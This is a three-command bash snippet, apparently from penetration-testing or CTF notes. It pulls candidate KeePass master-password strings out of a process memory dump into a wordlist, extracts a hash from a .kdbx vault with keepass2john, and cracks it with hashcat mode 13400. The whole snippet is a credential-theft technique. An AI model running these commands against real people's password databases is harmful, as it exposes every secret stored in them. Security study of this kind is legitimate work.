```bash
keepass-dump-extractor KeePassDumpFull.dmp -f all > wordlist.txt

keepass2john passwords.kdbx > passwords.kdbx.hash
hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt
```
